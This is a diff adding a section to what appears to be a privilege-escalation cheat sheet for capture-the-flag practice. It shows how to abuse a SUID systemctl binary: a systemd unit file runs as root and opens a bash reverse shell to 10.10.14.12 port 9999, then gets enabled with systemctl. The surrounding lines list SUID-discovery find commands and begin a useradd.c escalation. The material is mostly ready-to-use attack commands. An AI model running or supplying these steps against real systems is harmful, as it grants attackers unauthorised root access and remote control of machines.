@@ -102,6 +102,25 @@ find / -type f -perm -04000 -ls 2> /dev/null
 find / \( -perm -4000 \) -exec ls -ld {} \; 2>/dev/null
 ```
 
+### systemctl has SUID set
+Create root.service file
+```
+[Unit]
+Description=get root privilege
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/9999 0>&1'
+
+[Install]
+WantedBy=multi-user.target
+```
+Transfer it to CTF and runfollowing command
+```
+/bin/systemctl enable /home/pepper/root.service
+```
+
 ### If it is possible to run a c executable, run useradd.c file
 ```
 #include <stdlib.h> /* system, NULL, EXIT_FAILURE */
